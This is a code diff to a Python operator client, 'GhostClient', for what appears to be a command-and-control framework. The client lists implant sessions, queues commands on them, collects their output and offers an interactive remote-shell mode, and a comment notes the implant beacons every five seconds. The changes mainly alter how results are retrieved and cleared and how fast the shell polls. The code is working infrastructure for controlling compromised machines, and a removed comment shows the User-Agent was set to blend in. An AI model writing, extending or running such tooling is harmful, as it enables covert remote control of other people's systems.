@@ -13,7 +13,7 @@ Environment variables (used if flags are not provided):
 Commands:
     sessions              List active sessions
     task  <sid> <cmd>     Queue a command on a session
-    results <sid>         Retrieve and display results for a session
+    results <sid>         Retrieve and display results for a session (keeps by default, use --clear to clear)
     kill  <sid>           Queue an exit command and remove the session
     audit [--limit N]     View operator audit log
     shell <sid>           Enter interactive shell mode for a session
@@ -37,7 +37,7 @@ except ImportError:
 urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
 
 # ---------------------------------------------------------------------------
-# ANSI colour helpers (no external library required)
+# ANSI colour helpers
 # ---------------------------------------------------------------------------
 
 RESET   = "\033[0m"
@@ -72,7 +72,7 @@ class GhostClient:
         self.session.headers.update({
             "X-Operator-Token": operator_token,
             "Content-Type": "application/json",
-            "User-Agent": "Mozilla/5.0",   # blend in
+            "User-Agent": "Mozilla/5.0",
         })
 
     def _get(self, path: str, params: Optional[dict] = None) -> dict:
@@ -100,9 +100,14 @@ class GhostClient:
     def task(self, sid: str, cmd: str) -> dict:
         return self._post("/task", {"session": sid, "cmd": cmd})
 
-    def results(self, sid: str, keep: bool = False) -> dict:
-        params = {"keep": "1"} if keep else {}
+    def results(self, sid: str, clear: bool = False) -> dict:
+        """Retrieve results. If clear=True, results are removed after retrieval."""
+        params = {"clear": "1"} if clear else {}
         return self._get(f"/results/{sid}", params=params)
+
+    def clear_results(self, sid: str) -> dict:
+        """Explicitly clear results for a session."""
+        return self._get(f"/results/{sid}", params={"clear": "1"})
 
     def kill(self, sid: str) -> dict:
         return self._delete(f"/sessions/{sid}")
@@ -122,7 +127,6 @@ def _idle_label(idle_sec: float) -> str:
     else:
         color = RED
     return c(f"{idle_sec:.0f}s", color)
-
 
 def print_sessions(sessions: list) -> None:
     if not sessions:
@@ -170,7 +174,6 @@ def print_sessions(sessions: list) -> None:
         )
     print()
 
-
 def print_results(data: dict) -> None:
     results = data.get("results", [])
     sid     = data.get("session", "?")
@@ -192,7 +195,6 @@ def print_results(data: dict) -> None:
             print(c(f"── {ts} ──", GREY))
         print(out)
         print()
-
 
 def print_audit(data: dict) -> None:
     entries = data.get("entries", [])
@@ -218,33 +220,28 @@ def cmd_sessions(client: GhostClient, _args) -> None:
     data = client.list_sessions()
     print_sessions(data)
 
-
 def cmd_task(client: GhostClient, args) -> None:
     resp = client.task(args.sid, args.cmd)
     ok(f"Queued on {args.sid} | depth={resp.get('queue_depth', '?')}")
 
-
 def cmd_results(client: GhostClient, args) -> None:
-    keep = getattr(args, "keep", False)
-    data = client.results(args.sid, keep=keep)
+    clear = getattr(args, "clear", False)
+    data = client.results(args.sid, clear=clear)
     print_results(data)
-
 
 def cmd_kill(client: GhostClient, args) -> None:
     resp = client.kill(args.sid)
     ok(f"Exit queued for {args.sid} — {resp.get('status', '')}")
-
 
 def cmd_audit(client: GhostClient, args) -> None:
     limit = getattr(args, "limit", 50)
     data  = client.audit(limit=limit)
     print_audit(data)
 
-
 def cmd_shell(client: GhostClient, args) -> None:
     """
-    Interactive shell mode: repeatedly send commands and poll for results.
-    Type 'exit' or Ctrl-C to leave shell mode without killing the session.
+    Interactive shell mode: each command is queued, we poll for the result,
+    display it, and clear it automatically.
     """
     sid = args.sid
     info(f"Entering shell mode for session {c(sid, MAGENTA)}")
@@ -276,20 +273,23 @@ def cmd_shell(client: GhostClient, args) -> None:
             err(f"Failed to queue task: {e}")
             continue
 
-        # Poll for result — up to 3 minutes, 3-second intervals
         info("Waiting for result...")
-        deadline = time.time() + 180
+        # Poll with `clear=False` to get the result without deleting it.
+        # We'll clear it manually after printing.
+        deadline = time.time() + 30  # max 30 seconds (implant beacons every 5s)
         got_result = False
         while time.time() < deadline:
-            time.sleep(3)
+            time.sleep(2)  # poll every 2 seconds
             try:
-                data = client.results(sid, keep=False)
+                data = client.results(sid, clear=False)
                 if data.get("results"):
                     print_results(data)
+                    # Clear results so we don't see the same output again
+                    client.clear_results(sid)
                     got_result = True
                     break
             except requests.HTTPError:
-                pass
+                pass  # retry
 
         if not got_result:
             warn("Timed out waiting for result (task still queued).")
@@ -321,7 +321,7 @@ def build_parser() -> argparse.ArgumentParser:
 
     r = sub.add_parser("results", help="Retrieve results for a session")
     r.add_argument("sid", help="Session ID")
-    r.add_argument("--keep", action="store_true", help="Retrieve without clearing")
+    r.add_argument("--clear", action="store_true", help="Clear results after retrieval")
 
     k = sub.add_parser("kill", help="Queue exit and remove session")
     k.add_argument("sid", help="Session ID")
@@ -346,7 +346,6 @@ COMMAND_MAP = {
     "audit":    cmd_audit,
     "shell":    cmd_shell,
 }
-
 
 def main() -> None:
     parser = build_parser()
@@ -378,7 +377,6 @@ def main() -> None:
     except KeyboardInterrupt:
         print()
         sys.exit(0)
-
 
 if __name__ == "__main__":
     main()
